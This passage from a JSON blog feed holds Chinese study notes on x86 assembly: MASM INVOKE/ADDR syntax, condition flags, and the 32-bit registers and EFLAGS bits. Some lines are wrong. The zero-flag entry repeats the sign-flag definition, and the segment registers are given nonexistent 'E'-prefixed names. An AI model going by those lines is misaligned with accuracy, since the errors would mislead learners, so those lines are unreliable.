language-c++\" data-language=\"c++\"><code class=\"language-c++\">invoke Dumparray,offset array,lengthof array,type array<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"ADDR——–只能和INVOKE一起\"><a href=\"#ADDR——–只能和INVOKE一起\" class=\"headerlink\" title=\"ADDR——–只能和INVOKE一起\"></a>ADDR——–只能和INVOKE一起</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">array dword 20 dup(?)\ninvoke swap\n\taddr array\n\taddr [array+4]<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"条件标志\"><a href=\"#条件标志\" class=\"headerlink\" title=\"条件标志\"></a>条件标志</h2><h3 id=\"ZF-零标志\"><a href=\"#ZF-零标志\" class=\"headerlink\" title=\"ZF 零标志\"></a>ZF 零标志</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">当结果为负时,SF=1,否则,SF=0<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"AF-辅助进位标志\"><a href=\"#AF-辅助进位标志\" class=\"headerlink\" title=\"AF 辅助进位标志\"></a>AF 辅助进位标志</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">运算过程中第三位有进位值,置AF=1,否则,AF=0<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"PF-奇偶标志\"><a href=\"#PF-奇偶标志\" class=\"headerlink\" title=\"PF 奇偶标志\"></a>PF 奇偶标志</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">当结果操作数中偶数个\"1\",置PF=1,否则,PF=0<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"SF-符号标志\"><a href=\"#SF-符号标志\" class=\"headerlink\" title=\"SF 符号标志\"></a>SF 符号标志</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">当结果为负时,SF=1;否则,SF=0.溢出时情形例外<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"CF-进位标志\"><a href=\"#CF-进位标志\" class=\"headerlink\" title=\"CF 进位标志\"></a>CF 进位标志</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">最高有效位产生进位值,例如,执行加法指令时,MSB有进位,置CF=1;否则,CF=0<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"OF-溢出标志\"><a href=\"#OF-溢出标志\" class=\"headerlink\" title=\"OF 溢出标志\"></a>OF 溢出标志</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">若操作数结果超出了机器能表示的范围,则产生溢出,置OF=1,否则,OF=0<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n",
            "tags": [
                "学习",
                "汇编"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/01/01/ji-cun-qi/",
            "url": "https://0xdadream.github.io/2021/01/01/ji-cun-qi/",
            "title": "寄存器",
            "date_published": "2020-12-31T22:37:00.000Z",
            "content_html": "<h2 id=\"32位CPU所含有的寄存器有：\"><a href=\"#32位CPU所含有的寄存器有：\" class=\"headerlink\" title=\"32位CPU所含有的寄存器有：\"></a>32位CPU所含有的寄存器有：</h2><ol>\n<li>4个数据寄存器(EAX、EBX、ECX和EDX) </li>\n<li>2个变址和指针寄存器(ESI和EDI) </li>\n<li>2个指针寄存器(ESP和EBP)  </li>\n<li>6个段寄存器(ES、CS、SS、DS、FS和GS) </li>\n<li>1个指令指针寄存器(EIP) 1个标志寄存器(EFlags)</li>\n</ol>\n<h1 id=\"1、数据寄存器\"><a href=\"#1、数据寄存器\" class=\"headerlink\" title=\"1、数据寄存器\"></a>1、数据寄存器</h1><p>数据寄存器主要用来保存操作数和运算结果等信息，从而节省读取操作数所需占用总线和访问存储器的时间。 </p>\n<ul>\n<li><p>32位CPU有4个32位的通用寄存器EAX、EBX、ECX和EDX。 </p>\n</li>\n<li><p>对低16位数据的存取，不会影响高16位的数据。 这些低16位寄存器分别命名为：AX、BX、CX和DX，它和先前的CPU中的寄存器相一致。 </p>\n</li>\n<li><p>4个16位寄存器又可分割成8个独立的8位寄存器(AX：AH-AL、BX：BH-BL、CX：CH-CL、DX：DH-DL)，每个寄存器都有自己的名称，可独立存取。 程序员可利用数据寄存器的这种“可分可合”的特性，灵活地处理字/字节的信息。  </p>\n</li>\n<li><p>寄存器EAX通常称为累加器(Accumulator)，用累加器进行的操作可能需要更少时间。可用于乘、 除、输入/输出等操作，使用频率很高；  </p>\n</li>\n<li><p>寄存器EBX称为基地址寄存器(Base Register)。它可作为存储器指针来使用；  </p>\n</li>\n<li><p>寄存器ECX称为计数寄存器(Count Register)。 在循环和字符串操作时，要用它来控制循环次数；在位操作中，当移多位时，要用CL来指明移位的位数；  </p>\n</li>\n<li><p>寄存器EDX称为数据寄存器(Data Register)。在进行乘、除运算时，它可作为默认的操作数参与运算，也可用于存放I/O的端口地址。</p>\n</li>\n</ul>\n<p>在16位CPU中，AX、BX、CX和DX不能作为基址和变址寄存器来存放存储单元的地址， </p>\n<p>在32位CPU中，其32位寄存器EAX、EBX、ECX和EDX不仅可传送数据、暂存数据保存算术逻辑运算结果， 而且也可作为指针寄存器，所以，这些32位寄存器更具有通用性。 </p>\n<h1 id=\"2、变址寄存器\"><a href=\"#2、变址寄存器\" class=\"headerlink\" title=\"2、变址寄存器\"></a>2、变址寄存器</h1><p>32位CPU有2个32位通用寄存器ESI和EDI。 </p>\n<p>其低16位对应先前CPU中的SI和DI，对低16位数据的存取，不影响高16位的数据。 </p>\n<p>寄存器ESI、EDI、SI和DI称为变址寄存器(Index Register)，它们主要用于存放存储单元在段内的偏移量， 用它们可实现多种存储器操作数的寻址方式，为以不同的地址形式访问存储单元提供方便。 </p>\n<p>变址寄存器不可分割成8位寄存器。作为通用寄存器，也可存储算术逻辑运算的操作数和运算结果。 </p>\n<p>它们可作一般的存储器指针使用。在字符串操作指令的执行过程中，对它们有特定的要求，而且还具有特殊的功能。 </p>\n<h1 id=\"3、指针寄存器\"><a href=\"#3、指针寄存器\" class=\"headerlink\" title=\"3、指针寄存器\"></a>3、指针寄存器</h1><p>其低16位对应先前CPU中的BP和SP，对低16位数据的存取，不影响高16位的数据。 </p>\n<p>32位CPU有2个32位通用寄存器EBP和ESP。 </p>\n<p>它们主要用于访问堆栈内的存储单元，并且规定： </p>\n<ul>\n<li>EBP为基指针(Base Pointer)寄存器，用它可直接存取堆栈中的数据；  </li>\n<li>ESP为堆栈指针(Stack Pointer)寄存器，用它只可访问栈顶。</li>\n</ul>\n<p>寄存器EBP、ESP、BP和SP称为指针寄存器(Pointer Register)，主要用于存放堆栈内存储单元的偏移量， 用它们可实现多种存储器操作数的寻址方式，为以不同的地址形式访问存储单元提供方便。 </p>\n<p>指针寄存器不可分割成8位寄存器。作为通用寄存器，也可存储算术逻辑运算的操作数和运算结果。 </p>\n<h1 id=\"4、段寄存器\"><a href=\"#4、段寄存器\" class=\"headerlink\" title=\"4、段寄存器\"></a>4、段寄存器</h1><p>段寄存器是根据内存分段的管理模式而设置的。内存单元的物理地址由段寄存器的值和一个偏移量组合而成的，这样可用两个较少位数的值组合成一个可访问较大物理空间的内存地址。 </p>\n<p>CPU内部的段寄存器： </p>\n<ol>\n<li>ECS——代码段寄存器(Code Segment Register)，其值为代码段的段值；  </li>\n<li>EDS——数据段寄存器(Data Segment Register)，其值为数据段的段值；  </li>\n<li>EES——附加段寄存器(Extra Segment Register)，其值为附加数据段的段值；  </li>\n<li>ESS——堆栈段寄存器(Stack Segment Register)，其值为堆栈段的段值；  </li>\n<li>EFS——附加段寄存器(Extra Segment Register)，其值为附加数据段的段值；  </li>\n<li>EGS——附加段寄存器(Extra Segment Register)，其值为附加数据段的段值。  </li>\n<li></li>\n</ol>\n<ul>\n<li>在16位CPU系统中，它只有4个段寄存器，所以，程序在任何时刻至多有4个正在使用的段可直接访问；</li>\n<li>在32位微机系统中，它有6个段寄存器，所以，在此环境下开发的程序最多可同时访问6个段。</li>\n</ul>\n<p>32位CPU有两个不同的工作方式：实方式和保护方式。在每种方式下，段寄存器的作用是不同的。有关规定简 单描述如下： </p>\n<ul>\n<li><p>实方式： 前4个段寄存器CS、DS、ES和SS与先前CPU中的所对应的段寄存器的含义完全一致，内存单元的逻辑地址仍为“段值：偏移量”的形式。为访问某内存段内的数据，必须使用该段寄存器和存储单元的偏移量。  </p>\n</li>\n<li><p>保护方式： 在此方式下，情况要复杂得多，装入段寄存器的不再是段值，而是称为“选择子”(Selector)的某个值。</p>\n</li>\n</ul>\n<h1 id=\"5、指令指针寄存器\"><a href=\"#5、指令指针寄存器\" class=\"headerlink\" title=\"5、指令指针寄存器\"></a>5、指令指针寄存器</h1><p>32位CPU把指令指针扩展到32位，并记作EIP，EIP的低16位与先前CPU中的IP作用相同。 </p>\n<p>指令指针EIP、IP(Instruction Pointer)是存放下次将要执行的指令在代码段的偏移量。 </p>\n<p>在具有预取指令功能的系统中，下次要执行的指令通常已被预取到指令队列中，除非发生转移情况。 </p>\n<p>所以，在理解它们的功能时，不考虑存在指令队列的情况。 </p>\n<h1 id=\"6、标志寄存器\"><a href=\"#6、标志寄存器\" class=\"headerlink\" title=\"6、标志寄存器\"></a>6、标志寄存器</h1><h2 id=\"一、运算结果标志位\"><a href=\"#一、运算结果标志位\" class=\"headerlink\" title=\"一、运算结果标志位\"></a>一、运算结果标志位</h2><h3 id=\"1、进位标志CF-Carry-Flag\"><a href=\"#1、进位标志CF-Carry-Flag\" class=\"headerlink\" title=\"1、进位标志CF(Carry Flag)\"></a>1、进位标志CF(Carry Flag)</h3><p>进位标志CF主要用来反映运算是否产生进位或借位。如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。 </p>\n<p>使用该标志位的情况有：多字(字节)数的加减运算，无符号数的大小比较运算，移位操作，字(字节)之间移位，专门改变CF值的指令等。 </p>\n<h3 id=\"2、奇偶标志PF-Parity-Flag\"><a href=\"#2、奇偶标志PF-Parity-Flag\" class=\"headerlink\" title=\"2、奇偶标志PF(Parity Flag)\"></a>2、奇偶标志PF(Parity Flag)</h3><p>奇偶标志PF用于反映运算结果中“1”的个数的奇偶性。如果“1”的个数为偶数，则PF的值为1，否则其值为0。 </p>\n<p>利用PF可进行奇偶校验检查，或产生奇偶校验位。在数据传送过程中，为了提供传送的可靠性，如果采用奇偶校验的方法，就可使用该标志位。 </p>\n<h3 id=\"3、辅助进位标志AF-Auxiliary-Carry-Flag\"><a href=\"#3、辅助进位标志AF-Auxiliary-Carry-Flag\" class=\"headerlink\" title=\"3、辅助进位标志AF(Auxiliary Carry Flag)\"></a>3、辅助进位标志AF(Auxiliary Carry Flag)</h3><p>在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0： </p>\n<ol>\n<li>在字操作时，发生低字节向高字节进位或借位时； </li>\n<li>在字节操作时，发生低4位向高4位进位或借位时。</li>\n</ol>\n<p>对以上6个运算结果标志位，在一般编程情况下，标志位CF、ZF、SF和OF的使用频率较高，而标志位PF和AF的使用频率较低。 </p>\n<h3 id=\"4、零标志ZF-Zero-Flag\"><a href=\"#4、零标志ZF-Zero-Flag\" class=\"headerlink\" title=\"4、零标志ZF(Zero Flag)\"></a>4、零标志ZF(Zero Flag)</h3><p>零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。 </p>\n<h3 id=\"5、符号标志SF-Sign-Flag\"><a href=\"#5、符号标志SF-Sign-Flag\" class=\"headerlink\" title=\"5、符号标志SF(Sign Flag)\"></a>5、符号标志SF(Sign Flag)</h3><p>符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。在微机系统中，有符号数采用码表示法，所以，SF也就反映运算结果的正负号。运算结果为正数时，SF的值为0，否则其值为1。 </p>\n<h3 id=\"6、溢出标志OF-Overflow-Flag\"><a href=\"#6、溢出标志OF-Overflow-Flag\" class=\"headerlink\" title=\"6、溢出标志OF(Overflow Flag)\"></a>6、溢出标志OF(Overflow Flag)</h3><p>溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。 “</p>\n<p>溢出”和“进位”是两个不同含义的概念，不要混淆。</p>\n<h2 id=\"二、状态控制标志位\"><a href=\"#二、状态控制标志位\" class=\"headerlink\" title=\"二、状态控制标志位\"></a>二、状态控制标志位</h2><p>状态控制标志位是用来控制CPU操作的，它们要通过专门的指令才能使之发生改变。 </p>\n<h2 id=\"1、追踪标志TF-Trap-Flag\"><a href=\"#1、追踪标志TF-Trap-Flag\" class=\"headerlink\" title=\"1、追踪标志TF(Trap Flag)\"></a>1、追踪标志TF(Trap Flag)</h2><p>当追踪标志TF被置为1时，CPU进入单步执行方式，即每执行一条指令，产生一个单步中断请求。这种方式主要用于程序的调试。 指令系统中没有专门的指令来改变标志位TF的值，但程序员可用其它办法来改变其值。 </p>\n<h3 id=\"2、中断允许标志IF-Interrupt-enable-Flag\"><a href=\"#2、中断允许标志IF-Interrupt-enable-Flag\" class=\"headerlink\" title=\"2、中断允许标志IF(Interrupt-enable Flag)\"></a>2、中断允许标志IF(Interrupt-enable Flag)</h3><p>中断允许标志IF是用来决定CPU是否响应CPU外部的可屏蔽中断发出的中断请求。 但不管该标志为何值，CPU都必须响应CPU外部的不可屏蔽中断所发出的中断请求，以及CPU内部产生的中断请求。 具体规定如下： </p>\n<ol>\n<li>当IF=1时，CPU可以响应CPU外部的可屏蔽中断发出的中断请求； </li>\n<li>当IF=0时，CPU不响应CPU外部的可屏蔽中断发出的中断请求。 CPU的指令系统中也有专门的指令来改变标志位IF的值。</li>\n</ol>\n<h3 id=\"3、方向标志DF-Direction-Flag\"><a href=\"#3、方向标志DF-Direction-Flag\" class=\"headerlink\" title=\"3、方向标志DF(Direction Flag)\"></a>3、方向标志DF(Direction Flag)</h3><p>方向标志DF用来决定在串操作指令执行时有关指针寄存器发生调整的方向。 在微机的指令系统中，还提供了专门的指令来改变标志位DF的值。 </p>\n<h2 id=\"三、32位标志寄存器增加的标志位\"><a href=\"#三、32位标志寄存器增加的标志位\" class=\"headerlink\" title=\"三、32位标志寄存器增加的标志位\"></a>三、32位标志寄存器增加的标志位</h2><h3 id=\"1、I-O特权标志IOPL-I-O-Privilege-Level\"><a href=\"#1、I-O特权标志IOPL-I-O-Privilege-Level\" class=\"headerlink\" title=\"1、I/O特权标志IOPL(I/O Privilege Level)\"></a>1、I/O特权标志IOPL(I/O Privilege Level)</h3><p>I/O特权标志用两位二进制位来表示，也称为I/O特权级字段。该字段指定了要求执行I/O指令的特权级。 如果当前的特权级别在数值上小于等于IOPL的值，那么，该I/O指令可执行，否则将发生一个保护异常。 </p>\n<h3 id=\"2、嵌套任务标志NT-Nested-Task\"><a href=\"#2、嵌套任务标志NT-Nested-Task\" class=\"headerlink\" title=\"2、嵌套任务标志NT(Nested Task)\"></a>2、嵌套任务标志NT(Nested Task)</h3><p>嵌套任务标志NT用来控制中断返回指令IRET的执行。具体规定如下： </p>\n<ol>\n<li>当NT=0，用堆栈中保存的值恢复EFLAGS、CS和EIP，执行常规的中断返回操作； </li>\n<li>当NT=1，通过任务转换实现中断返回。</li>\n</ol>\n<h3 id=\"3、重启动标志RF-Restart-Flag\"><a href=\"#3、重启动标志RF-Restart-Flag\" class=\"headerlink\" title=\"3、重启动标志RF(Restart Flag)\"></a>3、重启动标志RF(Restart Flag)</h3><p>重启动标志RF用来控制是否接受调试故障。规定：RF=0时，表示“接受”调试故障，否则拒绝之。 在成功执行完一条指令后，处理机把RF置为0，当接受到一个非调试故障时，处理机就把它置为1。 </p>\n<h3 id=\"4、虚拟8086方式标志VM-Virtual-8086-Mode\"><a href=\"#4、虚拟8086方式标志VM-Virtual-8086-Mode\" class=\"headerlink\" title=\"4、虚拟8086方式标志VM(Virtual 8086 Mode)\"></a>4、虚拟8086方式标志VM(Virtual 8086 Mode)</h3><p>如果该标志的值为1，则表示处理机处于虚拟的8086方式下的工作状态，否则，处理机处于一般保护方式下的工作状态。 </p>\n",
            "tags": [
                "学习",
                "汇编"
            ]
        }
    ]
}